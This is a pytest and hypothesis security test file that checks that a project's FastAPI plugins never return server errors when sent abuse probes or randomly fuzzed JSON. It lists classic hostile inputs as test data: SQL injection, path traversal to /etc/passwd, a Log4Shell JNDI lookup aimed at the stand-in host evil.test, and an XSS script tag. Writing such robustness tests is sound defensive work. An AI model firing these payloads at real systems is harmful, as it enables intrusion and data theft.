from __future__ import annotations

import os

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from tests.plugin_expectations import VALID_EXECUTE_CASES

MAX_PROBE_LENGTH = int(os.environ.get("SWEETIE_MAX_PROBE_LENGTH", "4096"))
FAST_FUZZ_EXAMPLES = int(os.environ.get("SWEETIE_FAST_FUZZ_EXAMPLES", "2"))
DEEP_FUZZ_EXAMPLES = int(os.environ.get("SWEETIE_FUZZ_EXAMPLES", "8"))
FUZZ_MAX_KEYS = int(os.environ.get("SWEETIE_FUZZ_MAX_KEYS", "6"))
FUZZ_MAX_TEXT = int(os.environ.get("SWEETIE_FUZZ_MAX_TEXT", "32"))

MALICIOUS_STRINGS = [
    "' OR '1'='1",
    "../../../../etc/passwd",
    "${jndi:ldap://evil.test/a}",
    "<script>alert(1)</script>",
    "A" * MAX_PROBE_LENGTH,
]


def _fuzz_payloads():
    return st.dictionaries(
        st.text(min_size=1, max_size=20),
        st.one_of(
            st.integers(),
            st.floats(allow_nan=False),
            st.text(max_size=FUZZ_MAX_TEXT),
            st.booleans(),
            st.none(),
        ),
        max_size=FUZZ_MAX_KEYS,
    )


@pytest.mark.security
def test_common_abuse_payloads_do_not_crash(plugin, plugin_client_factory):
    if plugin.main_file is None:
        pytest.skip("Plugin has no FastAPI app")
    client = plugin_client_factory(plugin)
    base_case = (VALID_EXECUTE_CASES.get(plugin.name) or [{"type": plugin.capabilities[0], "payload": {}}])[0]
    for probe in MALICIOUS_STRINGS:
        mutated = {
            "type": base_case["type"],
            "payload": {
                **base_case.get("payload", {}),
                "probe": probe,
                "nested": {"probe": probe},
            },
        }
        response = client.post(plugin.entrypoints.get("execute", "/execute"), json=mutated)
        assert response.status_code < 500, f"{plugin.name} crashed on malicious probe {probe!r}"


@pytest.mark.security
@given(_fuzz_payloads())
@settings(max_examples=FAST_FUZZ_EXAMPLES, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture])
def test_generic_fuzzed_json_fast_never_500(plugin, plugin_client_factory, payload):
    if plugin.main_file is None:
        pytest.skip("Plugin has no FastAPI app")
    client = plugin_client_factory(plugin)
    action = (VALID_EXECUTE_CASES.get(plugin.name) or [{"type": plugin.capabilities[0]}])[0]["type"]
    response = client.post(plugin.entrypoints.get("execute", "/execute"), json={"type": action, "payload": payload})
    assert response.status_code < 500


@pytest.mark.security
@pytest.mark.slow
@given(_fuzz_payloads())
@settings(max_examples=DEEP_FUZZ_EXAMPLES, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture])
def test_generic_fuzzed_json_never_500(plugin, plugin_client_factory, payload):
    if plugin.main_file is None:
        pytest.skip("Plugin has no FastAPI app")
    client = plugin_client_factory(plugin)
    action = (VALID_EXECUTE_CASES.get(plugin.name) or [{"type": plugin.capabilities[0]}])[0]["type"]
    response = client.post(plugin.entrypoints.get("execute", "/execute"), json={"type": action, "payload": payload})
    assert response.status_code < 500
